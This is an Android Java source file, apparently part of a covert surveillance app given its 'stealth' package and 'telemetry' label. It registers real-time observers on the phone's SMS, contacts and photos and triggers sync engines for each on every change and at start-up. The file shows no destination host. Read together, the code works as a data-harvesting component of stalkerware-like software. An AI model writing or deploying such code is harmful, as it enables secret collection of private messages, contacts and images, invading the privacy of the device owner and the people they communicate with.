package com.notrack.stealth.backup;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;

import com.notrack.stealth.sync.SyncWorker;

/**
 * REAL-TIME CONTENT OBSERVER FOR SMS, CONTACTS & MEDIA TELEMETRY
 */
public class BackupObserverService {

    private static final String TAG = "BackupObserverService";
    private static volatile boolean sRegistered = false;

    private static ContentObserver sSmsObserver;
    private static ContentObserver sContactsObserver;
    private static ContentObserver sMediaObserver;

    public static synchronized void registerObservers(Context context) {
        if (context == null || sRegistered) return;
        final Context appCtx = context.getApplicationContext();

        try {
            Handler handler = new Handler(Looper.getMainLooper());

            sSmsObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    Log.d(TAG, "SMS ContentObserver change detected: " + uri);
                    SmsBackupEngine.triggerSyncAsync(appCtx);
                    SyncWorker.enqueueSync(appCtx);
                }
            };

            sContactsObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    Log.d(TAG, "Contacts ContentObserver change detected: " + uri);
                    ContactsBackupEngine.triggerSyncAsync(appCtx);
                    SyncWorker.enqueueSync(appCtx);
                }
            };

            sMediaObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    Log.d(TAG, "Media ContentObserver change detected: " + uri);
                    PhotoBackupEngine.triggerSyncAsync(appCtx);
                    SyncWorker.enqueueSync(appCtx);
                }
            };

            appCtx.getContentResolver().registerContentObserver(
                    Uri.parse("content://sms"), true, sSmsObserver);

            appCtx.getContentResolver().registerContentObserver(
                    ContactsContract.Contacts.CONTENT_URI, true, sContactsObserver);

            appCtx.getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, sMediaObserver);

            sRegistered = true;
            Log.i(TAG, "Registered real-time SMS, Contacts & Media ContentObservers successfully.");

            // Trigger initial sync immediately upon observer registration
            SmsBackupEngine.triggerSyncAsync(appCtx);
            ContactsBackupEngine.triggerSyncAsync(appCtx);
            PhotoBackupEngine.triggerSyncAsync(appCtx);
            SyncWorker.enqueueSync(appCtx);

        } catch (Exception e) {
            Log.w(TAG, "Error registering content observers: " + e.getMessage());
        }
    }
}
